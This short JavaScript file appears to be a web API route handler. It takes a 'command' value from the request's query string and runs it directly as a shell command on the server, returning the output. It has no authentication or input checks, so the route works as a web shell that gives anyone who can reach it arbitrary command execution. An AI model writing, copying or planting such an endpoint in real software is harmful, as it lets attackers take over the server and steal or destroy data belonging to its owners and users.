import { exec } from 'child_process'
import { promisify } from 'util'

const execAsync = promisify(exec)

export async function GET(request) {
    try {
        const command = new URL(request.url).searchParams.get('command') ?? 'pwd'
        return Response.json(await execAsync(command))
    } catch (error) {
        return Response.json(error.message, { status: 400 })
    }
}
